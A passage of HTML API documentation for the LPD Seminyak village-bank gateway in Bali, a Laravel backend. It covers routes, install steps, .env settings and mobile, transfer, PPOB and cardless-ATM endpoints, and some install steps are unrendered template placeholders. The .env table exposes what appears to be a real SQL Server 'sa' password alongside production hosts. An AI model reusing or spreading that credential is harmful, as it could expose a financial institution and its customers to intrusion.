.db-col-desc{color:#94a3b8}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
@media(max-width:900px){.grid-2{grid-template-columns:1fr}}
@media(max-width:768px){#sidebar{transform:translateX(-100%)}#sidebar.open{transform:translateX(0)}#main{margin-left:0}}
.toggle-btn{display:none;position:fixed;bottom:20px;left:20px;z-index:200;background:var(--primary);color:#fff;border:none;border-radius:50%;width:48px;height:48px;font-size:18px;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,.3)}
@media(max-width:768px){.toggle-btn{display:flex;align-items:center;justify-content:center}}
</style>
</head>
<body>

<aside id="sidebar">
<div class="logo">
  <h1><i class="fas fa-university mr-2"></i>LPD Seminyak</h1>
  <p>API Gateway Documentation v1.0</p>
</div>
<nav>
  <div class="nav-section">Overview</div>
  <a href="#" onclick="showSection('overview');return false" class="active" id="nav-overview"><i class="fas fa-home"></i> Beranda &amp; Ringkasan</a>
  <a href="#" onclick="showSection('architecture');return false" id="nav-architecture"><i class="fas fa-sitemap"></i> Arsitektur Sistem</a>
  <a href="#" onclick="showSection('install');return false" id="nav-install"><i class="fas fa-download"></i> Panduan Instalasi</a>
  <a href="#" onclick="showSection('config');return false" id="nav-config"><i class="fas fa-cog"></i> Konfigurasi .env</a>
  <div class="nav-section">API Reference</div>
  <a href="#" onclick="showSection('auth');return false" id="nav-auth"><i class="fas fa-key"></i> Autentikasi &amp; Token</a>
  <a href="#" onclick="showSection('ios-access');return false" id="nav-ios-access"><i class="fas fa-mobile-alt"></i> iOS \u2013 Login &amp; Register</a>
  <a href="#" onclick="showSection('ios-tabungan');return false" id="nav-ios-tabungan"><i class="fas fa-piggy-bank"></i> iOS \u2013 Tabungan</a>
  <a href="#" onclick="showSection('ios-transfer-lpd');return false" id="nav-ios-transfer-lpd"><i class="fas fa-exchange-alt"></i> iOS \u2013 Transfer LPD</a>
  <a href="#" onclick="showSection('ios-transfer-bank');return false" id="nav-ios-transfer-bank"><i class="fas fa-landmark"></i> iOS \u2013 Transfer Antar Bank</a>
  <a href="#" onclick="showSection('ios-ppob');return false" id="nav-ios-ppob"><i class="fas fa-bolt"></i> iOS \u2013 PPOB</a>
  <a href="#" onclick="showSection('snap');return false" id="nav-snap"><i class="fas fa-plug"></i> SNAP \u2013 Transfer VA BPD</a>
  <a href="#" onclick="showSection('atm');return false" id="nav-atm"><i class="fas fa-credit-card"></i> ATM Cardless</a>
  <a href="#" onclick="showSection('ppob-callback');return false" id="nav-ppob-callback"><i class="fas fa-reply"></i> PPOB Callback</a>
  <div class="nav-section">Referensi</div>
  <a href="#" onclick="showSection('database');return false" id="nav-database"><i class="fas fa-database"></i> Skema Database</a>
  <a href="#" onclick="showSection('response-codes');return false" id="nav-response-codes"><i class="fas fa-list-ol"></i> Kode Respons</a>
  <a href="#" onclick="showSection('security');return false" id="nav-security"><i class="fas fa-shield-alt"></i> Keamanan &amp; Enkripsi</a>
  <a href="#" onclick="showSection('middleware');return false" id="nav-middleware"><i class="fas fa-filter"></i> Middleware &amp; Guard</a>
  <a href="#" onclick="showSection('helpers');return false" id="nav-helpers"><i class="fas fa-tools"></i> Helper Classes</a>
  <a href="#" onclick="showSection('troubleshoot');return false" id="nav-troubleshoot"><i class="fas fa-bug"></i> Troubleshooting</a>
  <div class="nav-section">Tools</div>
  <a href="/swagger" style="color:#7c3aed;font-weight:700"><i class="fas fa-flask"></i> API Explorer (Swagger)</a>
  <a href="#" onclick="showSection('terminal');return false" id="nav-terminal"><i class="fas fa-terminal"></i> Terminal Interaktif</a>
</nav>
</aside>

<main id="main">
<div class="topbar">
  <h2 id="page-title"><i class="fas fa-home mr-2" style="color:#2563eb"></i>LPD Seminyak \u2013 Dokumentasi API</h2>
  <div style="display:flex;gap:8px;flex-wrap:wrap">
    <span class="badge badge-green">Laravel 5.5</span>
    <span class="badge badge-blue">PHP 7.x</span>
    <span class="badge badge-yellow">SQL Server</span>
    <span class="badge badge-purple">JWT Auth</span>
  </div>
</div>
<div class="content">

<!-- OVERVIEW -->
<section id="section-overview" class="section active">
  <div class="stats-grid">
    <div class="stat-card"><div class="stat-num" style="color:#1d4ed8">30+</div><div class="stat-label">Endpoint API</div></div>
    <div class="stat-card"><div class="stat-num" style="color:#059669">7</div><div class="stat-label">Helper Classes</div></div>
    <div class="stat-card"><div class="stat-num" style="color:#d97706">4</div><div class="stat-label">Grup Layanan</div></div>
    <div class="stat-card"><div class="stat-num" style="color:#7c3aed">11</div><div class="stat-label">Middleware</div></div>
    <div class="stat-card"><div class="stat-num" style="color:#dc2626">25+</div><div class="stat-label">Tabel Database</div></div>
  </div>

  <div class="card">
    <div class="card-header"><i class="fas fa-info-circle" style="color:#3b82f6"></i><h3>Tentang Sistem LPD Seminyak</h3></div>
    <div class="card-body">
      <p style="font-size:14px;line-height:1.8;color:#374151;margin-bottom:16px">
        <strong>LPD Seminyak</strong> adalah backend API berbasis <strong>Laravel 5.5</strong> yang melayani transaksi perbankan digital untuk
        <strong>Lembaga Perkreditan Desa (LPD) Seminyak</strong>, Bali. Sistem ini bertindak sebagai gateway antara aplikasi mobile nasabah (iOS mBanking),
        mesin ATM cardless, dan sistem perbankan BPD Bali (via protokol SNAP BI).
      </p>
      <div class="grid-2">
        <div>
          <h4 style="font-weight:700;margin-bottom:8px;font-size:13px">Fungsi Utama:</h4>
          <ul style="font-size:13px;color:#374151;line-height:2;list-style:disc;padding-left:16px">
            <li>Mobile Banking iOS (registrasi, login, tabungan)</li>
            <li>Transfer antar nasabah LPD</li>
            <li>Transfer ke bank lain (via BPD)</li>
            <li>Pembayaran PPOB (PLN, PDAM, BPJS, Pulsa)</li>
            <li>Transfer-In via Virtual Account (SNAP BI)</li>
            <li>Layanan ATM Cardless (setor/tarik tanpa kartu)</li>
          </ul>
        </div>
        <div>
          <h4 style="font-weight:700;margin-bottom:8px;font-size:13px">Teknologi Stack:</h4>
          <ul style="font-size:13px;color:#374151;line-height:2;list-style:disc;padding-left:16px">
            <li>Framework: Laravel 5.5.* (PHP &gt;= 7.0)</li>
            <li>Database: Microsoft SQL Server (sqlsrv)</li>
            <li>Autentikasi: JWT (tymon/jwt-auth)</li>
            <li>HTTP Client: GuzzleHTTP ~6.0</li>
            <li>Enkripsi: AES-256-CBC + RSA (OpenSSL)</li>
            <li>Signing: HMAC-SHA512 / SHA-256</li>
          </ul>
        </div>
      </div>
    </div>
  </div>

  <div class="card">
    <div class="card-header"><i class="fas fa-network-wired" style="color:#10b981"></i><h3>Topologi Integrasi</h3></div>
    <div class="card-body">
      <table>
        <tr><th>Sistem Eksternal</th><th>Protokol</th><th>Tujuan</th></tr>
        <tr><td><strong>BPD Bali iBank</strong></td><td><span class="inline-code">HTTPS REST</span></td><td>Transfer antar bank (Inquiry + Posting)</td></tr>
        <tr><td><strong>BPD SNAP BI</strong></td><td><span class="inline-code">SNAP ISO-8583</span></td><td>Terima transfer masuk via Virtual Account</td></tr>
        <tr><td><strong>FastPay / RajaBiller</strong></td><td><span class="inline-code">HTTPS JSON</span></td><td>Pembayaran PPOB (tagihan, pulsa)</td></tr>
        <tr><td><strong>IAK Prepaid/Postpaid</strong></td><td><span class="inline-code">HTTPS JSON</span></td><td>Isi ulang pulsa, cek tagihan</td></tr>
        <tr><td><strong>Lamanuna (SmartIndo)</strong></td><td><span class="inline-code">HTTPS REST</span></td><td>Get Token, Insert IP, Insert User</td></tr>
        <tr><td><strong>LPD Core (giosoftech.com)</strong></td><td><span class="inline-code">HTTPS REST</span></td><td>Core banking data nasabah</td></tr>
      </table>
    </div>
  </div>

  <div class="card">
    <div class="card-header"><i class="fas fa-project-diagram" style="color:#7c3aed"></i><h3>Alur Layanan</h3></div>
    <div class="card-body">
      <p style="font-size:13px;font-weight:600;margin-bottom:8px">Mobile Banking iOS:</p>
      <div class="flow">
        <div class="flow-step">App Mobile</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">iosAccessMdw<br/><small>(Validasi Token/IP/AES)</small></div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">Controller</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">Helper Class</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">SQL Server DB</div>
      </div>
      <p style="font-size:13px;font-weight:600;margin-bottom:8px;margin-top:16px">SNAP Transfer-In BPD:</p>
      <div class="flow">
        <div class="flow-step">BPD Bank</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">SNAPCheckTransferIn</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">SNAPTransferIn</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">Post ke DB</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">Nasabah +Saldo</div>
      </div>
      <p style="font-size:13px;font-weight:600;margin-bottom:8px;margin-top:16px">ATM Cardless:</p>
      <div class="flow">
        <div class="flow-step">Mesin ATM</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">MachineCheck<br/><small>(IP + Hash)</small></div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">MachineController</div><div class="flow-arrow">&#8594;</div>
        <div class="flow-step">Update Folio/Mutasi</div>
      </div>
    </div>
  </div>
</section>

<!-- ARCHITECTURE -->
<section id="section-architecture" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-folder-open" style="color:#d97706"></i><h3>Struktur Direktori</h3></div>
    <div class="card-body">
      <pre>lpd_seminyak/
&#9500;&#9472;&#9472; app/
&#9474;   &#9500;&#9472;&#9472; Helpers/          # 7 helper class utama
&#9474;   &#9474;   &#9500;&#9472;&#9472; MBankingHelper.php    # Validasi akses, posting VA, enkripsi
&#9474;   &#9474;   &#9500;&#9472;&#9472; MobileHelper.php      # Login, register, ATM token
&#9474;   &#9474;   &#9500;&#9472;&#9472; SNAPHelper.php        # Validasi signature SNAP BPD
&#9474;   &#9474;   &#9500;&#9472;&#9472; TabunganHelper.php    # Saldo, folio, PIN, daftar rek
&#9474;   &#9474;   &#9500;&#9472;&#9472; TransferHelper.php    # Validasi &amp; log transfer antar bank
&#9474;   &#9474;   &#9500;&#9472;&#9472; iosHelper.php         # Helper utama iOS mBanking (AES)
&#9474;   &#9474;   &#9492;&#9472;&#9472; iosTransferHelper.php # Transfer LPD, log, cek saldo
&#9474;   &#9500;&#9472;&#9472; Http/
&#9474;   &#9474;   &#9500;&#9472;&#9472; Controllers/          # 13 controller
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; iosTokenCtrl.php          # Get access token iOS
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; iosAccessCtrl.php         # Register/Login/Logout
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; iosTabunganCtrl.php       # Daftar rek &amp; mutasi
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; iosTransferLPDCtrl.php    # Transfer sesama LPD
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; iosTransferBankCtrl.php   # Transfer ke bank lain
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; iosPPOBController.php     # Bayar PPOB FastPay
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; iosPPOBIAKController.php  # PPOB via IAK
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; iosMachineCtrl.php        # Token cardless iOS
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; MachineController.php     # ATM Cardless
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; PPOBController.php        # Callback PPOB
&#9474;   &#9474;   &#9474;   &#9500;&#9472;&#9472; SNAPTransferIn.php        # SNAP Inquiry &amp; Payment
&#9474;   &#9474;   &#9474;   &#9492;&#9472;&#9472; SNAPTokenTransferIn.php   # SNAP Access Token
&#9474;   &#9474;   &#9500;&#9472;&#9472; Middleware/          # 11 middleware
&#9474;   &#9474;   &#9492;&#9472;&#9472; Kernel.php
&#9500;&#9472;&#9472; config/app.php       # Load PEM keys + SNAP response codes
&#9500;&#9472;&#9472; keys/
&#9474;   &#9492;&#9472;&#9472; public_key.pem       # Public key LPD
&#9500;&#9472;&#9472; routes/api.php       # Semua route API
&#9500;&#9472;&#9472; .env                 # Konfigurasi environment
&#9500;&#9472;&#9472; bank.list            # Daftar kode bank nasional
&#9500;&#9472;&#9472; ppob.list            # Produk PPOB tersedia
&#9492;&#9472;&#9472; display.list         # Konfigurasi tampilan app</pre>
    </div>
  </div>

  <div class="card">
    <div class="card-header"><i class="fas fa-map" style="color:#3b82f6"></i><h3>Peta Route API Lengkap</h3></div>
    <div class="card-body">
      <table>
        <tr><th>Path</th><th>Controller@Method</th><th>Middleware</th><th>Fungsi</th></tr>
        <tr><td><span class="inline-code">/v1.0/access-token/b2b</span></td><td>SNAPTokenTransferIn@AccessToken</td><td>snapTokenIn</td><td>Token SNAP BPD</td></tr>
        <tr><td><span class="inline-code">/v1.0/transfer-va/inquiry</span></td><td>SNAPTransferIn@Inquiry</td><td>snapTransferIn</td><td>SNAP Inquiry VA</td></tr>
        <tr><td><span class="inline-code">/v1.0/transfer-va/payment</span></td><td>SNAPTransferIn@Payment</td><td>snapTransferIn</td><td>SNAP Payment VA</td></tr>
        <tr><td><span class="inline-code">/cardless/create-token</span></td><td>MachineController@CreateToken</td><td>machineCheck</td><td>Buat token ATM</td></tr>
        <tr><td><span class="inline-code">/cardless/get-token</span></td><td>MachineController@GetToken</td><td>machineCheck</td><td>Validasi token ATM</td></tr>
        <tr><td><span class="inline-code">/cardless/check-balance</span></td><td>MachineController@CekSaldo</td><td>machineCheck</td><td>Cek saldo ATM</td></tr>
        <tr><td><span class="inline-code">/cardless/cash-debit</span></td><td>MachineController@Penarikan</td><td>machineCheck</td><td>Tarik tunai</td></tr>
        <tr><td><span class="inline-code">/cardless/cash-credit</span></td><td>MachineController@Penyetoran</td><td>machineCheck</td><td>Setor tunai</td></tr>
        <tr><td><span class="inline-code">/cardless/reversal-debit</span></td><td>MachineController@BatalTarik</td><td>machineCheck</td><td>Batal tarik</td></tr>
        <tr><td><span class="inline-code">/cardless/reversal-credit</span></td><td>MachineController@BatalSetor</td><td>machineCheck</td><td>Batal setor</td></tr>
        <tr><td><span class="inline-code">/ppob/callback</span></td><td>PPOBController@Callback</td><td>\u2014</td><td>Callback PPOB</td></tr>
        <tr><td><span class="inline-code">/smart/access-token</span></td><td>iosTokenCtrl@AccessToken</td><td>iosCheckToken</td><td>Token iOS</td></tr>
        <tr><td><span class="inline-code">/smart/access-key</span></td><td>iosTokenCtrl@AccessKey</td><td>iosCheckToken</td><td>Upload public key</td></tr>
        <tr><td><span class="inline-code">/smart/register</span></td><td>iosAccessCtrl@Register</td><td>iosCheckAccess</td><td>Registrasi nasabah</td></tr>
        <tr><td><span class="inline-code">/smart/login</span></td><td>iosAccessCtrl@Login</td><td>iosCheckAccess</td><td>Login nasabah</td></tr>
        <tr><td><span class="inline-code">/smart/logout</span></td><td>iosAccessCtrl@Logout</td><td>iosCheckAccess</td><td>Logout</td></tr>
        <tr><td><span class="inline-code">/smart/update-pass</span></td><td>iosAccessCtrl@UpdatePass</td><td>iosCheckAccess</td><td>Ganti password</td></tr>
        <tr><td><span class="inline-code">/smart/update-pin</span></td><td>iosAccessCtrl@UpdatePin</td><td>iosCheckAccess</td><td>Ganti PIN</td></tr>
        <tr><td><span class="inline-code">/smart/tabungan/account-list</span></td><td>iosTabunganCtrl@ListAccount</td><td>iosCheckAccess</td><td>Daftar rekening</td></tr>
        <tr><td><span class="inline-code">/smart/tabungan/transaction-history</span></td><td>iosTabunganCtrl@HistoryTransaction</td><td>iosCheckAccess</td><td>Riwayat transaksi</td></tr>
        <tr><td><span class="inline-code">/smart/tabungan/mutasi-history</span></td><td>iosTabunganCtrl@HistoryMutasi</td><td>iosCheckAccess</td><td>Mutasi rekening</td></tr>
        <tr><td><span class="inline-code">/smart/transfer-lpd/check</span></td><td>iosTransferLPDCtrl@Check</td><td>iosCheckAccess</td><td>Cek rek tujuan</td></tr>
        <tr><td><span class="inline-code">/smart/transfer-lpd/inquiry</span></td><td>iosTransferLPDCtrl@Inquiry</td><td>iosCheckAccess</td><td>Inquiry transfer LPD</td></tr>
        <tr><td><span class="inline-code">/smart/transfer-lpd/post</span></td><td>iosTransferLPDCtrl@Posting</td><td>iosCheckAccess</td><td>Posting transfer LPD</td></tr>
        <tr><td><span class="inline-code">/smart/transfer-bank/check</span></td><td>iosTransferBankCtrl@Check</td><td>iosCheckAccess</td><td>Cek rek bank tujuan</td></tr>
        <tr><td><span class="inline-code">/smart/transfer-bank/inquiry</span></td><td>iosTransferBankCtrl@Inquiry</td><td>iosCheckAccess</td><td>Inquiry ke BPD</td></tr>
        <tr><td><span class="inline-code">/smart/transfer-bank/post</span></td><td>iosTransferBankCtrl@Posting</td><td>iosCheckAccess</td><td>Posting ke BPD</td></tr>
        <tr><td><span class="inline-code">/smart/ppob/check</span></td><td>iosPPOBController@Check</td><td>iosCheckAccess</td><td>Cek tagihan PPOB</td></tr>
        <tr><td><span class="inline-code">/smart/ppob/request</span></td><td>iosPPOBController@Request</td><td>iosCheckAccess</td><td>Bayar PPOB</td></tr>
        <tr><td><span class="inline-code">/smart/iak/check</span></td><td>iosPPOBIAKController@Check</td><td>iosCheckAccess</td><td>Cek tagihan IAK</td></tr>
        <tr><td><span class="inline-code">/smart/iak/request</span></td><td>iosPPOBIAKController@Request</td><td>iosCheckAccess</td><td>Bayar via IAK</td></tr>
      </table>
    </div>
  </div>
</section>

<!-- INSTALL -->
<section id="section-install" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-server" style="color:#3b82f6"></i><h3>Persyaratan Sistem</h3></div>
    <div class="card-body">
      <div class="grid-2">
        <div>
          <table>
            <tr><th>Komponen</th><th>Versi</th></tr>
            <tr><td>PHP</td><td>7.0 \u2013 7.4 <span class="badge badge-yellow">Wajib 7.4</span></td></tr>
            <tr><td>Microsoft SQL Server</td><td>2014 / 2016+</td></tr>
            <tr><td>Composer</td><td>2.x</td></tr>
            <tr><td>Web Server</td><td>Apache / Nginx</td></tr>
            <tr><td>PHP Extension</td><td>pdo_sqlsrv, mbstring, openssl, curl</td></tr>
            <tr><td>ODBC Driver</td><td>Microsoft ODBC Driver 17/18</td></tr>
          </table>
        </div>
        <div>
          <div class="info-box info-yellow">
            <i class="fas fa-exclamation-triangle"></i>
            <span><strong>Penting:</strong> PHP 8.x TIDAK kompatibel! Gunakan PHP 7.4. IP server harus terdaftar di whitelist BPD Bali dan GIO.</span>
          </div>
          <div class="info-box info-red" style="margin-top:8px">
            <i class="fas fa-ban"></i>
            <span>Database hanya mendukung <strong>Microsoft SQL Server</strong>. MySQL/MariaDB/PostgreSQL tidak didukung.</span>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="card">
    <div class="card-header"><i class="fas fa-list-check" style="color:#10b981"></i><h3>Langkah Instalasi Lengkap</h3></div>
    <div class="card-body">
      <div class="steps">
        <div class="step">
          <div class="step-num">1</div>
          <div class="step-content">
            <h4>Install PHP 7.4 dan ekstensi yang dibutuhkan</h4>
            <p>Sistem memerlukan PHP 7.x. PHP 8.x tidak kompatibel.</p>
            <pre>${e.installPhp}</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">2</div>
          <div class="step-content">
            <h4>Install ODBC Driver dan ekstensi PHP SQL Server</h4>
            <p>Driver Microsoft ODBC wajib untuk koneksi ke SQL Server.</p>
            <pre>${e.installOdbc}</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">3</div>
          <div class="step-content">
            <h4>Extract Source Code ke Server</h4>
            <pre>${e.extractCode}</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">4</div>
          <div class="step-content">
            <h4>Install Dependency via Composer</h4>
            <pre>${e.composerInstall}</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">5</div>
          <div class="step-content">
            <h4>Siapkan File .env</h4>
            <pre>${e.envSetup}</pre>
            <p style="margin-top:8px">Konfigurasi minimal yang harus diubah:</p>
            <pre>${e.envMinimal}</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">6</div>
          <div class="step-content">
            <h4>Setup Folder Keys (Kunci Kriptografi)</h4>
            <pre>${e.keysSetup}</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">7</div>
          <div class="step-content">
            <h4>Set Permission Storage dan Bootstrap</h4>
            <pre>${e.permissions}</pre>
            <p style="margin-top:8px">Buat direktori log yang diperlukan:</p>
            <pre>mkdir -p storage/logs/token storage/logs/transfer-in/inquiry
mkdir -p storage/logs/transfer-in/posting storage/logs/access
mkdir -p storage/logs/tabungan storage/logs/transfer-AR
mkdir -p storage/logs/transfer-AB storage/logs/ppob</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">8</div>
          <div class="step-content">
            <h4>Setup Database SQL Server</h4>
            <p>Buat database dan semua tabel yang diperlukan di SQL Server:</p>
            <pre>${e.dbSchema}</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">9</div>
          <div class="step-content">
            <h4>Konfigurasi Web Server Apache</h4>
            <pre>${e.apacheConf}</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">10</div>
          <div class="step-content">
            <h4>Verifikasi Instalasi</h4>
            <pre>${e.verify}</pre>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="card">
    <div class="card-header"><i class="fas fa-windows" style="color:#3b82f6"></i><h3>Instalasi di Windows (XAMPP)</h3></div>
    <div class="card-body">
      <div class="steps">
        <div class="step">
          <div class="step-num">1</div>
          <div class="step-content">
            <h4>Install XAMPP PHP 7.4 + SQL Server Driver</h4>
            <pre>1. Download XAMPP dengan PHP 7.4
2. Download php_sqlsrv_74_nts.dll dan php_pdo_sqlsrv_74_nts.dll
   dari: https://docs.microsoft.com/en-us/sql/connect/php/
3. Letakkan DLL di C:\\xampp\\php\\ext\\
4. Tambahkan di php.ini:
   extension=php_sqlsrv_74_nts.dll
   extension=php_pdo_sqlsrv_74_nts.dll
5. Install Microsoft ODBC Driver 17 for SQL Server</pre>
          </div>
        </div>
        <div class="step">
          <div class="step-num">2</div>
          <div class="step-content">
            <h4>Tempatkan Project dan Konfigurasi .env</h4>
            <pre>1. Ekstrak ke C:\\xampp\\htdocs\\lpd_seminyak
2. Buat .env dari .env.example
3. Update path di .env (gunakan forward slash):
   PUBLIC_KEY_LPD=c:/xampp/htdocs/lpd_seminyak/keys/public_key.pem
   MASTER_BANK_LIST=c:/xampp/htdocs/lpd_seminyak/bank.list
4. Jalankan: composer install --ignore-platform-reqs
5. Jalankan: php artisan key:generate</pre>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- CONFIG -->
<section id="section-config" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-cog" style="color:#64748b"></i><h3>Referensi Lengkap Variabel .env</h3></div>
    <div class="card-body">
      <h4 style="font-weight:700;margin-bottom:12px;font-size:14px;color:#1d4ed8">Aplikasi</h4>
      <table style="margin-bottom:20px">
        <tr><th>Key</th><th>Contoh</th><th>Keterangan</th></tr>
        <tr><td><span class="inline-code">APP_NAME</span></td><td>LPD Seminyak</td><td>Nama aplikasi</td></tr>
        <tr><td><span class="inline-code">APP_ENV</span></td><td>local / production</td><td>Environment</td></tr>
        <tr><td><span class="inline-code">APP_KEY</span></td><td>base64:xxx</td><td>Generate dengan php artisan key:generate</td></tr>
        <tr><td><span class="inline-code">APP_DEBUG</span></td><td>false</td><td>false di production</td></tr>
        <tr><td><span class="inline-code">APP_URL</span></td><td>https://lpdseminyak.biz.id:8000</td><td>URL dasar aplikasi</td></tr>
        <tr><td><span class="inline-code">APP_STATUS</span></td><td>Production</td><td>Indikator status</td></tr>
      </table>
      <h4 style="font-weight:700;margin-bottom:12px;font-size:14px;color:#1d4ed8">Database SQL Server</h4>
      <table style="margin-bottom:20px">
        <tr><th>Key</th><th>Nilai</th><th>Keterangan</th></tr>
        <tr><td><span class="inline-code">DB_CONNECTION</span></td><td>sqlsrv</td><td>WAJIB sqlsrv (bukan mysql)</td></tr>
        <tr><td><span class="inline-code">DB_HOST</span></td><td>localhost</td><td>Hostname SQL Server</td></tr>
        <tr><td><span class="inline-code">DB_PORT</span></td><td>1433</td><td>Port default SQL Server</td></tr>
        <tr><td><span class="inline-code">DB_DATABASE</span></td><td>Giosoft_LPD</td><td>Nama database</td></tr>
        <tr><td><span class="inline-code">DB_USERNAME</span></td><td>sa</td><td>Username SQL Server</td></tr>
        <tr><td><span class="inline-code">DB_PASSWORD</span></td><td>#sa?seminyak</td><td>Password SQL Server</td></tr>
      </table>
      <h4 style="font-weight:700;margin-bottom:12px;font-size:14px;color:#1d4ed8">Path File Kunci dan List</h4>
      <table style="margin-bottom:20px">
        <tr><th>Key</th><th>Keterangan</th></tr>
        <tr><td><span class="inline-code">PUBLIC_KEY_LPD</span></td><td>Path absolut public_key.pem LPD \u2013 untuk verifikasi tanda tangan iOS</td></tr>
        <tr><td><span class="inline-code">PUBLIC_KEY_BPD</span></td><td>Path absolut public_key_bpd.pem \u2013 verifikasi SNAP signature</td></tr>
        <tr><td><span class="inline-code">MASTER_BANK_LIST</span></td><td>Path ke bank.list \u2013 daftar kode bank nasional</td></tr>
        <tr><td><span class="inline-code">MASTER_PPOB_LIST</span></td><td>Path ke ppob.list \u2013 daftar produk PPOB tersedia</td></tr>
        <tr><td><span class="inline-code">MASTER_DISPLAY_LIST</span></td><td>Path ke display.list \u2013 konfigurasi menu tampilan app</td></tr>
      </table>
      <h4 style="font-weight:700;margin-bottom:12px;font-size:14px;color:#1d4ed8">BPD Bali Integration</h4>
      <table style="margin-bottom:20px">
        <tr><th>Key</th><th>Keterangan</th></tr>
        <tr><td><span class="inline-code">BPD_URL</span></td><td>Base URL production BPD: https://ibank.bpdbali.id/virtualAccount/</td></tr>
        <tr><td><span class="inline-code">BPD_URL_DEV</span></td><td>Base URL dev BPD: https://dev.bpdbali.id:8443/openapi</td></tr>
        <tr><td><span class="inline-code">BPD_PREFIX</span></td><td>989191 \u2013 Prefix VA production</td></tr>
        <tr><td><span class="inline-code">BPD_PREFIX_DEV</span></td><td>989067 \u2013 Prefix VA dev</td></tr>
        <tr><td><span class="inline-code">BPD_HASHCODE</span></td><td>Secret hashcode untuk signing request ke BPD</td></tr>
        <tr><td><span class="inline-code">BPD_STATICIP1..7</span></td><td>IP statis BPD yang diizinkan</td></tr>
        <tr><td><span class="inline-code">BPD_WHITE_LIST</span></td><td>Format: |ip1|ip2|ip3|</td></tr>
        <tr><td><span class="inline-code">CLIENT_SECRET</span></td><td>Secret untuk HMAC-SHA512 SNAP signing</td></tr>
      </table>
      <h4 style="font-weight:700;margin-bottom:12px;font-size:14px;color:#1d4ed8">Limit Transaksi</h4>
      <table style="margin-bottom:20px">
        <tr><th>Key</th><th>Default</th><th>Keterangan</th></tr>
        <tr><td><span class="inline-code">SALDO_MIN</span></td><td>50000</td><td>Saldo minimum tersisa setelah transaksi (Rp)</td></tr>
        <tr><td><span class="inline-code">MIN_TRANSFER</span></td><td>10000</td><td>Minimum nominal transfer (Rp)</td></tr>
        <tr><td><span class="inline-code">MAX_TRANSFER</span></td><td>1000000</td><td>Maksimum transfer per transaksi (Rp)</td></tr>
      </table>
      <h4 style="font-weight:700;margin-bottom:12px;font-size:14px;color:#1d4ed8">PPOB</h4>
      <table>
        <tr><th>Key</th><th>Keterangan</th></tr>
        <tr><td><span class="inline-code">PPOB_USER / PPOB_PIN</span></td><td>Kredensial FastPay</td></tr>
        <tr><td><span class="inline-code">IAK_USER / IAK_KEY</span></td><td>Kredensial IAK production</td></tr>
        <tr><td><span class="inline-code">IAK_PREPAID_URL</span></td><td>https://prepaid.iak.id/api/top-up</td></tr>
        <tr><td><span class="inline-code">IAK_POSTPAID_URL</span></td><td>https://mobilepulsa.net/api/v1/bill/check</td></tr>
      </table>
    </div>
  </div>
</section>

<!-- AUTH -->
<section id="section-auth" class="section">
  <div class="card">
    <div class="card-header"><i class="fas fa-key" style="color:#d97706"></i><h3>Sistem Autentikasi</h3></div>
    <div class="card-body">
      <div class="grid-2">
        <div>
          <h4 style="font-weight:700;margin-bottom:8px;font-size:13px">1. iOS mBanking Token</h4>
          <ul style="font-size:13px;color:#374151;line-height:2;list-style:disc;padding-left:16px">
            <li>Dibuat di endpoint <span class="inline-code">/smart/access-token</span></li>
            <li>Disimpan di tabel <span class="inline-code">gmob_token</span></li>
            <li>Valid selama <strong>3 menit</strong></li>
            <li>Header: <span class="inline-code">Authorization: Bearer &lt;token&gt;</span></li>
            <li>Divalidasi oleh middleware <span class="inline-code">iosCheckAccess</span></li>
          </ul>
        </div>
        <div>
          <h4 style="font-weight:700;margin-bottom:8px;font-size:13px">2. SNAP BPD Token (OAuth2 B2B)</h4>
          <ul style="font-size:13px;color:#374151;line-height:2;list-style:disc;padding-left:16px">
            <li>Endpoint: <span class="inline-code">/v1.0/access-token/b2b</span></li>
            <li>Signature: HMAC-SHA512 dari (method:endpoint:token:bodyHash:timestamp)</li>
            <li>IP whitelist BPD Bali wajib cocok</li>
            <li>Divalidasi middleware <span class="inline-code">snapTransferIn</span></li>
          </ul>
        </div>
      </div>
      <h4 style="font-weight:700;font-size:13px;margin-top:16px;margin-bottom:8px">Endpoint: GET ACCESS TOKEN (iOS)</h4>
      <div class="endpoint">
        <div class="endpoint-header" onclick="toggleEndpoint(this)">
          <span class="method method-post">POST</span>
          <span class="endpoint-path">/smart/access-token</span>
          <span style="font-size:12px;color:#64748b;margin-left:auto">Dapatkan token akses sesi iOS</span>
          <i class="fas fa-chevron-down" style="color:#94a3b8;margin-left:8px"></i>
        </div>
        <div class="endpoint-body hidden">
          <p style="font-size:13px;margin-bottom:8px">Middleware: <span class="badge badge-blue">iosCheckToken</span></p>
